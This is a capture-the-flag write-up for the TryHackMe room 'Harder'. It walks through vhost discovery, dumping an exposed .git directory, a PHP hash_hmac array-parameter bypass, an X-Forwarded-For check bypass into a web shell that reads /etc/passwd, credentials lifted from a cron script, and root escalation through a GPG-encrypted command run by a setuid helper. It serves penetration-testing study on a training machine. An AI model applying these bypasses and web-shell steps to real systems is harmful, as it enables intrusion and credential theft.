---
title: "Harder : TryHackMe"
last_modified_at: 2021-02-13
categories:
  - TryHackMe
author_profile: false
tags:
  - git
  - HTTP Header
  - linux 
  - TryHackMe
---

Real pentest findings combined

alpine real world git seclists

![](https://cdn-images-1.medium.com/max/2000/1*S00YPvnJduZLGyIAhOqSUQ.png)

Task 1: Hack your way and try harder
> The machine is completly inspired by real world pentest findings. Perhaps you will consider them very challanging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distibution is used and where certain configurations are located.
> Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists ([https://tools.kali.org/password-attacks/seclists](https://tools.kali.org/password-attacks/seclists)). Read the source with care.

As the description says, we need to look at everything closely, every status code, cookies, etc.

## Nmap Scan
> # nmap -sS -A -o nmap <ip>
-A : Os detection, version detection, traceroute
-sS : TCP syn scan ( for faster scan, needs root privilege )
-o : For storing output in file <nmap in this case>

    Nmap scan report for 10.10.63.111
    Host is up (0.18s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    **22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
    80/tcp open  http    nginx 1.18.0**
    |_http-server-header: nginx/1.18.0
    |_http-title: Error
    Network Distance: 2 hops
    <OS detection data>

    TRACEROUTE (using port 1720/tcp)
    HOP RTT       ADDRESS
    1   182.12 ms 10.8.0.1
    2   182.51 ms 10.10.63.111

So we got port 80 and port 22 open.

## Http service ( Port 80 )

![](https://cdn-images-1.medium.com/max/2366/1*F8fsZ-eHFM4NcvCV2hx5tQ.png)

Using gobuster for directory busting
> $gobuster -u [http://10.10.232.123/](http://10.10.232.123/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-u : url
-w : wordlist

    =====================================================
    Gobuster v2.0.1              OJ Reeves ([@TheColonial](http://twitter.com/TheColonial))
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : [http://10.10.232.123/](http://10.10.232.123/)
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Timeout      : 10s
    =====================================================
    2020/08/16 05:19:45 Starting gobuster
    =====================================================
    2020/08/16 05:19:46 [-] Wildcard response found: [http://10.10.232.123/f00df75c-6253-49a7-aad9-f87e45b19ea1](http://10.10.232.123/f00df75c-6253-49a7-aad9-f87e45b19ea1) => 200
    2020/08/16 05:19:46 [!] To force processing of Wildcard responses, specify the '-fw' switch.
    =====================================================
    2020/08/16 05:19:46 Finished
    =====================================================

All error requests are redirected to this error page.

Let’s intercept requests on burp and have a look at response headers.

    HTTP/1.1 200 OK
    Server: nginx/1.18.0
    Date: Sun, 16 Aug 2020 14:22:04 GMT
    Content-Type: text/html; charset=UTF-8
    Connection: close
    Vary: Accept-Encoding
    X-Powered-By: PHP/7.3.19
    Set-Cookie: TestCookie=just+a+test+cookie; expires=Sun, 16-Aug-2020 15:22:04 GMT; Max-Age=3600; path=/; **domain=pwd.harder.local**; secure
    Content-Length: 1985

So it sets a cookie to the domain pwd.harder.localwhich means there should be another site hosted using virtual hosting with server name pwd.harder.local.

For accessing this site, we need to set the host header to pwd.harder.local. To do that we can add an entry in our /etc/hosts file

    $ sudo echo "<machine_ip_address> pwd.harder.local" >> /etc/hosts

/etc/hosts should look like this

    127.0.0.1       localhost
    127.0.1.1       kali
    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    **<machine_ip_address> pwd.harder.local**

Now lets access pwd.harder.local.

![[http://pwd.harder.local](http://pwd.harder.local)](https://cdn-images-1.medium.com/max/2000/1*tVXxXDy7fmT522KXLMXMjQ.png)*[http://pwd.harder.local](http://pwd.harder.local)*

On trying default username and password, we can log in as admin: admin.

![](https://cdn-images-1.medium.com/max/2000/1*KRU3_CD1GEe5LyPtaKu7kg.png)

Looking at the response header

    **HTTP/1.1 400 Bad Request**
    Server: nginx/1.18.0
    Date: Sun, 16 Aug 2020 14:45:12 GMT 
    Content-Type: text/html; charset=UTF-8 
    Transfer-Encoding: chunked 
    Connection: keep-alive 
    X-Powered-By: PHP/7.3.19 
    Expires: Thu, 19 Nov 1981 08:52:00 GMT 
    Cache-Control: no-store, no-cache, must-revalidate 
    Pragma: no-cache

We got a 400 Bad Request, we will get into that in a bit.

Since git is one of the tags of the room, so I tried accessing

    [http://pwd.harder.local/.git/](http://pwd.harder.local/.git/)
    # weget 403 forbidden error but on other request we get 404 not found

Which means there is a git directory. So we need to enumerate the git directory. In order to get the contents of the directory, I used this [tool](https://github.com/internetwache/GitTools).

    $ /opt/GitTools/Dumper/gitdumper.sh [http://pwd.harder.local/.git/](http://pwd.harder.local/.git/) git

Now cd into git and viewing logs.

    $ git log
    commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
    Author: evs <evs@harder.htb>
    Date:   Thu Oct 3 18:12:23 2019 +0300

    add gitignore

    commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
    Author: evs <evs@harder.htb>
    Date:   Thu Oct 3 18:11:32 2019 +0300

    add extra security

    commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
    Author: evs <evs@harder.htb>
    Date:   Thu Oct 3 14:00:52 2019 +0300

    added index.php

In order to get all the files in the previous commits

    $ **git checkout .**
    Updated 4 paths from the index
    $ **ls -a**
    .  ..  auth.php  .git  .gitignore  hmac.php  index.php
    $ **cat .gitignore**
    credentials.php
    secret.php

So there is credentials.php file in the server and we need to access it to gain more access.

Contents of index.php

    <?php
      session_start();
      require("auth.php");
      $login = new Login;
      $login->authorize();
      require("hmac.php");
      require("credentials.php");
    ?> 
      <table style="border: 1px solid;">
         <tr>
           <td style="border: 1px solid;">url</td>
           <td style="border: 1px solid;">username</td>
           <td style="border: 1px solid;">password (cleartext)</td>
         </tr>
         <tr>
           <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>
           <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>
           <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>
         </tr>
       </table>

Here it includes auth, calls the authorize method in Login class, and includes hmac and credentials. At last, it prints the $creds array’s content.

If you look into the auth.php file, it does not do much. It has a login class with authorize method. Authorize method checks if the cookies are set or not and if the cookies match the credentials, then the user stays logged in or is logged out. So if we use admin: admin creds we are logged in.

Now it includes hmac.php

    <?php
    if (empty($_GET['h']) || empty($_GET['host'])) {
       header('HTTP/1.0 400 Bad Request');
       print("missing get parameter");
       die();
    }
    require("secret.php"); //set $secret var
    if (isset($_GET['n'])) {
       $secret = hash_hmac('sha256', $_GET['n'], $secret);
    }

    $hm = hash_hmac('sha256', $_GET['host'], $secret);
    if ($hm !== $_GET['h']){
      header('HTTP/1.0 403 Forbidden');
      print("extra security check failed");
      die();
    }
    ?>

If we look at the headers after logging in we saw 400 Bad Request. Sow this must be running and we didn't set the **h** and **host** parameter.

    if (isset($_GET['n'])) {
       $secret = hash_hmac('sha256', $_GET['n'], $secret);
    }
    $hm = hash_hmac('sha256', $_GET['host'], $secret);
    if ($hm !== $_GET['h']){
      header('HTTP/1.0 403 Forbidden');
      print("extra security check failed");
      die();
    }

If **n** is set then it creates sha256 hash with data **n** and secret $secret ($secret is defined in secrets.php which we don’t have access to) and assigns to variable $secret. This $secret is again used as secret key with data from **host** parameter to create a sha256 hash which is assigned to $hm. If that is equal to **h** get parameter then we can get further.

Since we don't have access to $secret value so we need to bypass this. [This](https://www.securify.nl/blog/SFY20180101/spot-the-bug-challenge-2018-warm-up.html) article has information on how to bypass the check.

Following the article, if an array is passed as parameter **n **then the hmac function becomes

    $secret = hash_hmac('sha256',Array(),$secret)
    # It expects string but array is given so it gives a warning and returns false

Now $secret becomes false then the third parameter becomes false and we can generate hmac hash of any text and get further.

    hash_hmac('sha256','ros.com',false) 
    73aeb29c6c1c96be662ca4b240afe6bfc950c2f60d6c612e7b4f79a92d662701

Now if we give this URL

    [http://pwd.harder.local/index.php?n[]=1&host=ros.com&h=73aeb29c6c1c96be662ca4b240afe6bfc950c2f60d6c612e7b4f79a92d662701](http://pwd.harder.local/index.php?n[]=1&host=ros.com&h=73aeb29c6c1c96be662ca4b240afe6bfc950c2f60d6c612e7b4f79a92d662701)
    n : array
    host : ros.com
    h : 73aeb29c6c1c96be662ca4b240afe6bfc950c2f60d6c612e7b4f79a92d662701

This results in

![](https://cdn-images-1.medium.com/max/2000/1*kjO_MlTxbdzhx_frk8syMw.png)

We get another virtual host. Now again we need to add this to /etc/hosts file in order to access this

    <machine_ip_address> shell.harder.htb

![](https://cdn-images-1.medium.com/max/2000/1*Gt45c2bJ7DM2DuO9VP84ow.png)

Again we get the 404 pages, so I thought the vhost should be different. In order to make it similar to the other vhost. Changed the vhost to **shell.harder.local** editing the /etc/hosts file.

On accessing [http://shell.harder.local/](http://shell.harder.local/) we get the login page and the new credentials worked.

![](https://cdn-images-1.medium.com/max/2000/1*rgDQcH1GFuV6Lv2pC458uA.png)

On logging in we get

![](https://cdn-images-1.medium.com/max/2000/1*QMje_TR7vPtSjf2bOVGmqA.png)

So now we need to bypass this. In order to bypass this, we need to set the X-Forwarded-For header and set its value to 10.10.10.0/24

![](https://cdn-images-1.medium.com/max/2000/1*xCzHvm5VUqhbzgDs5X2liA.png)

On viewing on the browser

![](https://cdn-images-1.medium.com/max/2000/1*6gRY0DLRR6N_rxz1Lfvmzw.png)

So we got a web shell. Again intercepted the request in burp in order to run the commands and setting the X-Forwarded-For header.

On running whoami we get www .

/etc/passwd

    root:x:0:0:root:/root:/bin/ash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    man:x:13:15:man:/usr/man:/sbin/nologin
    postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/:/sbin/nologin
    nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
    evs:x:1000:1000:Linux User,,,:/home/evs:/bin/ash
    www:x:1001:1001:www:/home/www:/bin/ash
> cmd=ls -la /home/evs

    total 12
    drwxr-sr-x    1 evs      evs           4096 Jul  7 22:29 .
    drwxr-xr-x    1 root     root          4096 Jul  7 22:28 ..
    -rw-r--r--    1 evs      evs             33 Jul  6 22:02 user.txt

We got the user.

find command was not working so had to do the manual enumeration.

On enumerating the cronjobs, we get a file
> cmd=ls -la /etc/periodic/15min/

    total 12
    drwxr-xr-x    1 root     root          4096 Jul  7 22:29 .
    drwxr-xr-x    1 root     root          4096 May 29 14:20 ..
    -rwxr-xr-x    1 www      www            190 Jul  6 21:40 evs-backup.sh
> cmd=ls -la /etc/periodic/15min/evs-backup.sh

    #!/bin/ash

    # ToDo: create a backup script, that saves the /www directory to our internal server
    # for authentication use ssh with user "evs" and password <password>

Now ssh on the server, to get a shell

![](https://cdn-images-1.medium.com/max/2000/1*pfFzIDGd52cVp7qsOp6WAw.png)

Enumerating the box with linenum script didn't work. So enumerated manually to search for .sh scripts.

    harder:~$ find / -name *.sh 2>/dev/null
    /usr/bin/findssl.sh
    /usr/local/bin/run-crypted.sh
    /etc/periodic/15min/evs-backup.sh
> /usr/local/bin/run-crypted.sh

    harder:~$ cat /usr/local/bin/run-crypted.sh 
    #!/bin/sh

    if [ $# -eq 0 ]
      then
        echo -n "[*] Current User: ";
        whoami;
        echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
        echo "[-] Create a file like this: echo -n whoami > command"
        echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
      else
        export GNUPGHOME=/root/.gnupg/
        gpg --decrypt --no-verbose "$1" | ash
    fi

Files in /usr/local/bin

    harder:~$ ls -la /usr/local/bin/
    total 32
    drwxr-xr-x    1 root     root          4096 Jul  7 22:28 .
    drwxr-xr-x    1 root     root          4096 May 29 14:20 ..
    **-rwsr-x---    1 root     evs          19960 Jul  6 21:28 execute-crypted**
    -rwxr-x---    1 root     evs            412 Jul  7 20:58 run-crypted.sh

We have the **execute-crypted** binary with **suid** set. So we need to follow along the **run-crypted.sh** script to get the root flag.

So we need to search for gpg key

    harder:~$ find / -name "root@harder*" 2>/dev/null
    /var/backup/root@harder.local.pub

So we have a public key. Now we need to encrypt the command file using this public key to get the root flag.

In order to sign, let’s first import the gpg key

    harder:~$ **gpg --import /var/backup/root@harder.local.pub**
    gpg: directory '/home/evs/.gnupg' created
    gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
    gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
    gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
    gpg: Total number processed: 1
    gpg:               imported: 1

Create a filename with the command to read root flag

    harder:~$ **echo "cat /root/root.txt" > cmd**

Now encrypt the file

    harder:~$ **gpg --recipient root@harder.local cmd **
    gpg: WARNING: no command supplied.  Trying to guess what you mean ...
    gpg: no valid OpenPGP data found.
    gpg: processing message failed: Unknown system error
    harder:~$ gpg --recipient root@harder.local --encrypt cmd 
    gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

    sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
     Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
          Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

    It is NOT certain that the key belongs to the person named
    in the user ID.  If you *really* know what you are doing,
    you may answer the next question with yes.

    Use this key anyway? (y/N) y

Which creates a file **cmd.gpg** in the directory

Running /usr/local/bin/execute-crypted with the encrypted file, we get the flag

    harder:~$ **/usr/local/bin/execute-crypted cmd.gpg** 
    gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
          "Administrator <root@harder.local>"
     <flag.txt>

This way I got the flags. This was a different type of OS, so enumerating the box was a bit difficult. Hope you liked the writeup. If you have any suggestions feel free to comment.
